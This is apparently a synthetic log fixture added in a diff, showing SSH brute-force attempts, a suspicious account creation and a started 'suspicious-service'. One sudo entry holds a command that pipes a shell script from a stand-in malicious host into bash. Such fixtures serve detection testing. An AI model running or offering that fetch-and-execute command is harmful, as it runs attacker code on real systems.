@@ -1,0 +1,16 @@
+Jan 30 14:20:12 web-server-01 sshd[1234]: Failed password for root from 203.0.113.50 port 22 ssh2
+Jan 30 14:20:13 web-server-01 sshd[1235]: Failed password for root from 203.0.113.50 port 22 ssh2
+Jan 30 14:20:14 web-server-01 sshd[1236]: Failed password for root from 203.0.113.50 port 22 ssh2
+Jan 30 14:20:15 web-server-01 sshd[1237]: Failed password for root from 203.0.113.50 port 22 ssh2
+Jan 30 14:20:16 web-server-01 sshd[1238]: Failed password for root from 203.0.113.50 port 22 ssh2
+Jan 30 14:20:17 web-server-01 sshd[1239]: Failed password for root from 203.0.113.50 port 22 ssh2
+Jan 30 14:20:18 web-server-01 sshd[1240]: Failed password for root from 203.0.113.50 port 22 ssh2
+Jan 30 14:20:19 web-server-01 sshd[1241]: Failed password for admin from 198.51.100.25 port 22 ssh2
+Jan 30 14:20:20 web-server-01 sshd[1242]: Failed password for admin from 198.51.100.25 port 22 ssh2
+Jan 30 14:20:21 web-server-01 sshd[1243]: Failed password for admin from 198.51.100.25 port 22 ssh2
+Jan 30 14:20:22 web-server-01 sshd[1244]: Failed password for admin from 198.51.100.25 port 22 ssh2
+Jan 30 14:20:23 web-server-01 sshd[1245]: Failed password for admin from 198.51.100.25 port 22 ssh2
+Jan 30 14:20:24 web-server-01 sshd[1246]: Failed password for admin from 198.51.100.25 port 22 ssh2
+Jan 30 02:15:33 db-server-02 useradd[5678]: new user: name=backup_admin, UID=1001, GID=1001, home=/home/backup_admin, shell=/bin/bash
+Jan 30 14:10:25 web-server-01 sudo[9876]: www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash -c "curl -s http://malicious-site.com/shell.sh | bash"
+Jan 30 14:45:30 web-server-01 systemd[1]: Started suspicious-service.service
